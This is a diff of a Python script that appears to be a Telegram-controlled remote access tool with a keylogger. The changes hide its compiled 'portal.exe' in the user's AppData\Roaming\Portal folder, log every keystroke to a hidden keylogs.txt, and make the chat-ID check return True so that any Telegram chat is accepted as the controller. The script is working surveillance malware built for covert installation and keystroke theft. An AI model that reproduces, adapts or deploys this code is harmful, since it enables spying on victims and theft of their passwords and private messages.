@@ -21,18 +21,18 @@ def checkchat_id(chat_id):
 	# REPLACE '123456' WITH YOUR ACTUAL chat_id!
 	known_ids = ['123456']
 	# COMMENT THE LINE 'return True'!
-	#return True
+	return True
 	try:
 		return str(chat_id) in known_ids
 	except:
 		return str(chat_id) == known_ids
 
 if (argv[0]).endswith('.exe'):
-	win_folder = os.environ['WINDIR']	# = 'C:\Windows'
+	appdata_roaming_folder = os.environ['APPDATA']	# = 'C:\Users\Username\AppData\Roaming'
 	# HIDING OPTIONS
 	# ---------------------------------------------
-	hide_folder = win_folder + r'\Portal'	# = 'C:\Windows\Portal'
-	compiled_name = 'portal.exe'	# Name of compiled .exe to hide in hide_folder, i.e C:\Windows\Portal\portal.exe
+	hide_folder = appdata_roaming_folder + r'\Portal'	# = 'C:\Users\Username\AppData\Roaming\Portal'
+	compiled_name = 'portal.exe'	# Name of compiled .exe to hide in hide_folder, i.e 'C:\Users\Username\AppData\Roaming\Portal\portal.exe'
 	# ---------------------------------------------
 	if not os.path.exists(hide_folder):
 		os.makedirs(hide_folder)
@@ -50,28 +50,27 @@ else:
 		os.makedirs(hide_folder)
 
 initi = False
-user = os.environ.get("USERNAME")	# Windows username
+user = os.environ.get("USERNAME")	# Windows username to append keylogs.txt
 log_file = hide_folder + '\\keylogs.txt'
 with open(log_file, "a") as writing:
 	writing.write("-------------------------------------------------\n")
 	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n")
 
-def pressed_chars(event):	# on key pressed function
+def pressed_chars(event):
     if event.Ascii:
-        f = open(log_file,"a")	# open log_file in append mode
-        char = chr(event.Ascii)	# insert real char in variable
-        if event.Ascii == 8:	# if char is "backspace"
+        f = open(log_file,"a")
+        char = chr(event.Ascii)
+        if event.Ascii == 8:
         	f.write("[BS]")
-	if event.Ascii == 9:	# if char is "tab"
+	if event.Ascii == 9:
 		f.write("[TAB]")
-        if event.Ascii == 13:	# if char is "backspace"
+        if event.Ascii == 13:
             f.write("[ENTER]\n")
-        f.write(char)	# write the char pressed
+        f.write(char)
 
 def handle(msg):
 	chat_id = msg['chat']['id']
 	print('')
-	#print(strftime('[%d %b, %y %r] ') + str(chat_id) + ': ' + command)
 
 	if checkchat_id(chat_id):
 		print msg
